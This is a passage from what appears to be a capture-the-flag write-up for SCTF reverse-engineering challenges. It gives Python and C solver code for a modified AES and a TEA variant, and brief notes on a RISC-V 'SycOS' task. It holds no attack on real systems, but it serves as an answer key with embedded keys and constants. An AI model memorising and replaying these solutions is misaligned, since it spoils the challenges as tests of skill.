    input_array[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> [ input_array[<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">3</span>] ]  <span style="color:#f92672">+</span> input_array[<span style="color:#ae81ff">1</span>][:<span style="color:#ae81ff">3</span>]

columns_matrix <span style="color:#f92672">=</span> [
    [<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>],
    [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">1</span>],
    [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>],
    [<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>]
]

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_mix_columns</span>(input_array):
    res_array <span style="color:#f92672">=</span> [[<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>], [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>], [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>], [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>]]
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
            res <span style="color:#f92672">=</span> _GF2(<span style="color:#ae81ff">0</span>)
            <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
                res <span style="color:#f92672">+=</span> _GF2(columns_matrix[i][k]) <span style="color:#f92672">*</span> _GF2(input_array[k][j])
            res <span style="color:#f92672">%=</span> _GF2(<span style="color:#ae81ff">0b100011011</span>)
            res_array[i][j] <span style="color:#f92672">=</span> res<span style="color:#f92672">.</span>data
    <span style="color:#66d9ef">return</span> res_array

columns_matrix_inverse <span style="color:#f92672">=</span> [
    [<span style="color:#ae81ff">0xe</span>, <span style="color:#ae81ff">0xb</span>, <span style="color:#ae81ff">0xd</span>, <span style="color:#ae81ff">0x9</span>],
    [<span style="color:#ae81ff">0x9</span>, <span style="color:#ae81ff">0xe</span>, <span style="color:#ae81ff">0xb</span>, <span style="color:#ae81ff">0xd</span>],
    [<span style="color:#ae81ff">0xd</span>, <span style="color:#ae81ff">0x9</span>, <span style="color:#ae81ff">0xe</span>, <span style="color:#ae81ff">0xb</span>],
    [<span style="color:#ae81ff">0xb</span>, <span style="color:#ae81ff">0xd</span>, <span style="color:#ae81ff">0x9</span>, <span style="color:#ae81ff">0xe</span>]
]

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_mix_columns_inverse</span>(input_array):
    res_array <span style="color:#f92672">=</span> [[<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>], [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>], [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>], [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>]]
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
            res <span style="color:#f92672">=</span> _GF2(<span style="color:#ae81ff">0</span>)
            <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
                res <span style="color:#f92672">+=</span> _GF2(columns_matrix_inverse[i][k]) <span style="color:#f92672">*</span> _GF2(input_array[k][j])
            res <span style="color:#f92672">%=</span> _GF2(<span style="color:#ae81ff">0b100011011</span>)
            res_array[i][j] <span style="color:#f92672">=</span> res<span style="color:#f92672">.</span>data
    <span style="color:#66d9ef">return</span> res_array

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_add_round_key</span>(input_array, key_array):
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
            input_array[i][j] <span style="color:#f92672">^=</span> key_array[i][j]

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_key_schedule</span>(pre_key, round):
    next_key <span style="color:#f92672">=</span> [[<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>], [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>], [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>], [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>]]
    <span style="color:#75715e"># print (pre_key)</span>
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
        next_key[i][<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> pre_key[i <span style="color:#f92672">-</span> <span style="color:#ae81ff">3</span>][<span style="color:#ae81ff">3</span>]
    _sub_bytes(next_key)
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
        next_key[i][<span style="color:#ae81ff">0</span>] <span style="color:#f92672">^=</span> pre_key[i][<span style="color:#ae81ff">0</span>]
    next_key[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">0</span>] <span style="color:#f92672">^=</span> (_GF2(pow(<span style="color:#ae81ff">2</span>, round)) <span style="color:#f92672">%</span> _GF2(<span style="color:#ae81ff">0x11b</span>))<span style="color:#f92672">.</span>data
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">4</span>):
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
            next_key[j][i] <span style="color:#f92672">=</span> next_key[j][i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">^</span> pre_key[j][i]
    <span style="color:#66d9ef">return</span> next_key

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_aes_key_gen</span>(key):
    key <span style="color:#f92672">=</span> _convert_to_array(key)
    round_key <span style="color:#f92672">=</span> [key]
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
        round_key<span style="color:#f92672">.</span>append(_key_schedule(round_key[i], i))
    <span style="color:#66d9ef">return</span> round_key

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_convert_to_int</span>(input_array):
    output_int <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
            output_int <span style="color:#f92672">&lt;&lt;=</span> <span style="color:#ae81ff">8</span>
            output_int <span style="color:#f92672">|=</span> input_array[j][i]
    <span style="color:#66d9ef">return</span> output_int

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sycaes_encrypt</span>(plain_text, key):
    plain_text <span style="color:#f92672">^=</span> key
    round_key <span style="color:#f92672">=</span> _aes_key_gen(key)
    plain_array <span style="color:#f92672">=</span> _convert_to_array(plain_text)
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">10</span>):
        _sub_bytes_inverse(plain_array)
        _shift_rows_inverse(plain_array)
        plain_array <span style="color:#f92672">=</span> _mix_columns(plain_array)
        _add_round_key(plain_array, round_key[i])
    _sub_bytes(plain_array)
    _shift_rows(plain_array)
    _add_round_key(plain_array, round_key[<span style="color:#ae81ff">10</span>])
    <span style="color:#66d9ef">return</span> _convert_to_int(plain_array)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sycaes_decrypt</span>(cipher_text, key):
    round_key <span style="color:#f92672">=</span> _aes_key_gen(key)[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
    cipher_array <span style="color:#f92672">=</span> _convert_to_array(cipher_text)
    _add_round_key(cipher_array, round_key[<span style="color:#ae81ff">0</span>])
    _shift_rows_inverse(cipher_array)
    _sub_bytes_inverse(cipher_array)
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">10</span>):
        _add_round_key(cipher_array, round_key[i])
        cipher_array <span style="color:#f92672">=</span> _mix_columns_inverse(cipher_array)
        _shift_rows(cipher_array)
        _sub_bytes(cipher_array)
    _add_round_key(cipher_array, round_key[<span style="color:#ae81ff">10</span>])
    <span style="color:#66d9ef">return</span> _convert_to_int(cipher_array)

<span style="color:#f92672">from</span> libnum <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
k <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Welcome_to_sctf!&#34;</span>
ex_key <span style="color:#f92672">=</span> _aes_key_gen(s2n(k))

cipher <span style="color:#f92672">=</span> [
    <span style="color:#ae81ff">0xBE</span>, <span style="color:#ae81ff">0x1C</span>, <span style="color:#ae81ff">0xB3</span>, <span style="color:#ae81ff">0xF3</span>, <span style="color:#ae81ff">0xA1</span>, <span style="color:#ae81ff">0xF4</span>, <span style="color:#ae81ff">0xE4</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0xE1</span>, 
    <span style="color:#ae81ff">0x1C</span>, <span style="color:#ae81ff">0x6B</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x0A</span>, <span style="color:#ae81ff">0xDF</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0xF2</span>, <span style="color:#ae81ff">0x93</span>, <span style="color:#ae81ff">0x55</span>, <span style="color:#ae81ff">0xDA</span>, 
    <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xFC</span>, <span style="color:#ae81ff">0xA2</span>, <span style="color:#ae81ff">0x3C</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0x2E</span>, <span style="color:#ae81ff">0x7F</span>, <span style="color:#ae81ff">0x8D</span>, <span style="color:#ae81ff">0xA4</span>, 
    <span style="color:#ae81ff">0x6D</span>, <span style="color:#ae81ff">0x4E</span>
]

tmp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
<span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> cipher[:<span style="color:#ae81ff">16</span>]:
    tmp <span style="color:#f92672">&lt;&lt;=</span> <span style="color:#ae81ff">8</span>
    tmp <span style="color:#f92672">+=</span> c

res <span style="color:#f92672">=</span> n2s(sycaes_decrypt(tmp, s2n(k)))

print (s2n(res[:<span style="color:#ae81ff">4</span>][::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]))
print (s2n(res[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">8</span>][::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]))
print (s2n(res[<span style="color:#ae81ff">8</span>:<span style="color:#ae81ff">12</span>][::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]))
print (s2n(res[<span style="color:#ae81ff">12</span>:][::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]))

tmp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
<span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> cipher[<span style="color:#ae81ff">16</span>:]:
    tmp <span style="color:#f92672">&lt;&lt;=</span> <span style="color:#ae81ff">8</span>
    tmp <span style="color:#f92672">+=</span> c

res <span style="color:#f92672">=</span> n2s(sycaes_decrypt(tmp, s2n(k)))

print (s2n(res[:<span style="color:#ae81ff">4</span>][::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]))
print (s2n(res[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">8</span>][::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]))
print (s2n(res[<span style="color:#ae81ff">8</span>:<span style="color:#ae81ff">12</span>][::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]))
print (s2n(res[<span style="color:#ae81ff">12</span>:][::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]))

</code></pre></div><p>galois.py</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">GF2</span>:
    <span style="color:#66d9ef">def</span> __init__(self, v):
        self<span style="color:#f92672">.</span>data <span style="color:#f92672">=</span> v
    <span style="color:#66d9ef">def</span> __str__(self):
        <span style="color:#66d9ef">return</span> hex(self<span style="color:#f92672">.</span>data)
    <span style="color:#66d9ef">def</span> __repr__(self):
        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;GF2(0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">)&#34;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>data
    <span style="color:#66d9ef">def</span> __add__(self, other):
        <span style="color:#66d9ef">return</span> GF2(self<span style="color:#f92672">.</span>data <span style="color:#f92672">^</span> other<span style="color:#f92672">.</span>data)
    <span style="color:#66d9ef">def</span> __sub__(self, other):
        <span style="color:#66d9ef">return</span> GF2(self<span style="color:#f92672">.</span>data <span style="color:#f92672">^</span> other<span style="color:#f92672">.</span>data)
    <span style="color:#66d9ef">def</span> __lshift__(self, other):
        <span style="color:#66d9ef">return</span> GF2(self<span style="color:#f92672">.</span>data <span style="color:#f92672">&lt;&lt;</span> other)
    <span style="color:#66d9ef">def</span> __eq__(self, other):
        <span style="color:#66d9ef">if</span> type(other) <span style="color:#f92672">==</span> type(<span style="color:#ae81ff">1</span>):
            <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>data <span style="color:#f92672">==</span> other:
                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
            <span style="color:#66d9ef">else</span>: 
                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
        <span style="color:#66d9ef">if</span> type(other) <span style="color:#f92672">==</span> type(self):
            <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>data <span style="color:#f92672">==</span> other<span style="color:#f92672">.</span>data:
                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
            <span style="color:#66d9ef">else</span>: 
                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
    <span style="color:#66d9ef">def</span> __mul__(self, other):
        ans <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(bin(self<span style="color:#f92672">.</span>data)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>):
            <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>data <span style="color:#f92672">&amp;</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> i):
                ans <span style="color:#f92672">^=</span> other<span style="color:#f92672">.</span>data <span style="color:#f92672">&lt;&lt;</span> i
        <span style="color:#66d9ef">return</span> GF2(ans)
    <span style="color:#66d9ef">def</span> __truediv__(self, other):
        a <span style="color:#f92672">=</span> self
        b <span style="color:#f92672">=</span> other
        <span style="color:#66d9ef">if</span> b<span style="color:#f92672">.</span>data <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
            <span style="color:#66d9ef">return</span> a
        lena <span style="color:#f92672">=</span> len(bin(a<span style="color:#f92672">.</span>data)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>
        lenb <span style="color:#f92672">=</span> len(bin(b<span style="color:#f92672">.</span>data)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>
        ans <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
        <span style="color:#66d9ef">while</span> lena <span style="color:#f92672">&gt;=</span> lenb:
            a <span style="color:#f92672">=</span> a <span style="color:#f92672">+</span> (b <span style="color:#f92672">&lt;&lt;</span> lena <span style="color:#f92672">-</span> lenb)
            ans <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> (lena <span style="color:#f92672">-</span> lenb)
            lena <span style="color:#f92672">=</span> len(bin(a<span style="color:#f92672">.</span>data)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>
        <span style="color:#66d9ef">return</span> GF2(ans)
    <span style="color:#66d9ef">def</span> __floordiv__(self, other):
        <span style="color:#66d9ef">return</span> self <span style="color:#f92672">/</span> other
    <span style="color:#66d9ef">def</span> __isub__(self, other):
        <span style="color:#66d9ef">return</span> self <span style="color:#f92672">-</span> other
    <span style="color:#66d9ef">def</span> __mod__(self, other):
        a <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>data
        b <span style="color:#f92672">=</span> other<span style="color:#f92672">.</span>data
        lena <span style="color:#f92672">=</span> len(bin(a)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>
        lenb <span style="color:#f92672">=</span> len(bin(b)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>
        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(lena, lenb <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
            <span style="color:#66d9ef">if</span> a <span style="color:#f92672">&amp;</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
                a <span style="color:#f92672">^=</span> (b <span style="color:#f92672">&lt;&lt;</span> i <span style="color:#f92672">-</span> lenb)
        <span style="color:#66d9ef">return</span> GF2(a)
    <span style="color:#66d9ef">def</span> __pow__(self, other, modulo <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>):
        d <span style="color:#f92672">=</span> GF2(<span style="color:#ae81ff">1</span>)
        <span style="color:#66d9ef">while</span> other <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
            <span style="color:#66d9ef">if</span> other <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>:
                d <span style="color:#f92672">=</span> d <span style="color:#f92672">*</span> self
                <span style="color:#66d9ef">if</span> modulo <span style="color:#f92672">!=</span> <span style="color:#66d9ef">None</span>:
                    d <span style="color:#f92672">%=</span> modulo
            other <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">1</span>
            self <span style="color:#f92672">*=</span> self
            <span style="color:#66d9ef">if</span> modulo <span style="color:#f92672">!=</span> <span style="color:#66d9ef">None</span>:
                self <span style="color:#f92672">%=</span> modulo
        <span style="color:#66d9ef">return</span> d

</code></pre></div><p>tea.c</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;  </span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;  </span><span style="color:#75715e">
</span><span style="color:#75715e"></span>  
<span style="color:#75715e">//加密函数  
</span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">encrypt</span> (<span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span> v, <span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span> k) {  
    <span style="color:#66d9ef">uint32_t</span> v0<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">0</span>], v1<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">1</span>], sum<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, i;           <span style="color:#75715e">/* set up */</span>  
    <span style="color:#66d9ef">uint32_t</span> delta<span style="color:#f92672">=</span><span style="color:#ae81ff">1935897702</span>;                     <span style="color:#75715e">/* a key schedule constant */</span>  
    <span style="color:#66d9ef">uint32_t</span> k0<span style="color:#f92672">=</span>k[<span style="color:#ae81ff">0</span>], k1<span style="color:#f92672">=</span>k[<span style="color:#ae81ff">1</span>], k2<span style="color:#f92672">=</span>k[<span style="color:#ae81ff">2</span>], k3<span style="color:#f92672">=</span>k[<span style="color:#ae81ff">3</span>];   <span style="color:#75715e">/* cache key */</span>  
    <span style="color:#66d9ef">for</span> (i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; i<span style="color:#f92672">++</span>) {                       <span style="color:#75715e">/* basic cycle start */</span>  
        sum <span style="color:#f92672">+=</span> delta;  
        v0 <span style="color:#f92672">+=</span> (sum <span style="color:#f92672">+</span> i )<span style="color:#f92672">^</span>(((v1<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> k2) <span style="color:#f92672">^</span> (v1 <span style="color:#f92672">+</span> sum) <span style="color:#f92672">^</span> ((v1<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> k3));  
        v1 <span style="color:#f92672">+=</span> (sum <span style="color:#f92672">+</span> i )<span style="color:#f92672">^</span>(((v0<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> k0) <span style="color:#f92672">^</span> (v0 <span style="color:#f92672">+</span> sum) <span style="color:#f92672">^</span> ((v0<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> k1));  
    }                                              <span style="color:#75715e">/* end cycle */</span>  
    v[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span>v0; v[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span>v1;  
}  
<span style="color:#75715e">//解密函数  
</span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">decrypt</span> (<span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span> v, <span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span> k) {  
    <span style="color:#66d9ef">uint32_t</span> delta<span style="color:#f92672">=</span><span style="color:#ae81ff">1935897702</span>;                     <span style="color:#75715e">/* a key schedule constant */</span>  
    <span style="color:#66d9ef">uint32_t</span> v0<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">0</span>], v1<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">1</span>], sum<span style="color:#f92672">=</span>delta <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>;
    <span style="color:#66d9ef">int</span> i;  <span style="color:#75715e">/* set up */</span>  
    <span style="color:#66d9ef">uint32_t</span> k0<span style="color:#f92672">=</span>k[<span style="color:#ae81ff">0</span>], k1<span style="color:#f92672">=</span>k[<span style="color:#ae81ff">1</span>], k2<span style="color:#f92672">=</span>k[<span style="color:#ae81ff">2</span>], k3<span style="color:#f92672">=</span>k[<span style="color:#ae81ff">3</span>];   <span style="color:#75715e">/* cache key */</span>  
    <span style="color:#66d9ef">for</span> (i<span style="color:#f92672">=</span><span style="color:#ae81ff">31</span>; i<span style="color:#f92672">&gt;=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">--</span>) {                         <span style="color:#75715e">/* basic cycle start */</span>  
        v1 <span style="color:#f92672">-=</span> (sum <span style="color:#f92672">+</span> i )<span style="color:#f92672">^</span>(((v0<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> k0) <span style="color:#f92672">^</span> (v0 <span style="color:#f92672">+</span> sum) <span style="color:#f92672">^</span> ((v0<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> k1)); 
        v0 <span style="color:#f92672">-=</span> (sum <span style="color:#f92672">+</span> i )<span style="color:#f92672">^</span>(((v1<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> k2) <span style="color:#f92672">^</span> (v1 <span style="color:#f92672">+</span> sum) <span style="color:#f92672">^</span> ((v1<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> k3)); 
        sum <span style="color:#f92672">-=</span> delta;  
    }                                              <span style="color:#75715e">/* end cycle */</span>  
    v[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span>v0; v[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span>v1;  
}  
  
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){  
    v[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;s&#39;</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x66666666</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">2650095043</span>;
    v[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;c&#39;</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x66666666</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">1257176610</span>;
    v[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;t&#39;</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x66666666</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">407123268</span>;
    v[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;f&#39;</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x66666666</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">3718944108</span>;
    v[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;s&#39;</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x66666666</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">703929021</span>;
    v[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;c&#39;</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x66666666</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">1889742860</span>;
    v[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;t&#39;</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">2436073003</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x66666666</span>;
    v[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;f&#39;</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">2423013887</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x66666666</span>;
    decrypt(v, k);  
    decrypt(v<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>, k);  
    decrypt(v<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>, k);  
    decrypt(v<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>, k);  
    printf(<span style="color:#e6db74">&#34;0x%x, 0x%x, &#34;</span>,v[<span style="color:#ae81ff">0</span>],v[<span style="color:#ae81ff">1</span>]);  
    printf(<span style="color:#e6db74">&#34;0x%x, 0x%x, &#34;</span>,v[<span style="color:#ae81ff">2</span>],v[<span style="color:#ae81ff">3</span>]);  
    printf(<span style="color:#e6db74">&#34;0x%x, 0x%x, &#34;</span>,v[<span style="color:#ae81ff">4</span>],v[<span style="color:#ae81ff">5</span>]);  
    printf(<span style="color:#e6db74">&#34;0x%x, 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,v[<span style="color:#ae81ff">6</span>],v[<span style="color:#ae81ff">7</span>]);  

    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;  
}  
</code></pre></div><h3 id="sycos">SycOS</h3>
<p>riscv 架构，ghidra 打开</p>
<p>读取 0x40 长度，每个字符分别计算 0x80 次线性同余方程，然后分两部分存储</p>
<p>0x10 轮加密，依次进行：tea 运算、两部分中各取出 0x100 进行交换，然后进行系统调用，动调发现内核中的处理只是把两部分字符串做了交换</p>
<blockquote>
<p>系统调用可以根据 &ldquo;sys call&rdquo; 字符串定位到</p>
</blockquote>
<p>tea 的加密一个是 16 轮的一个是 8 轮</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
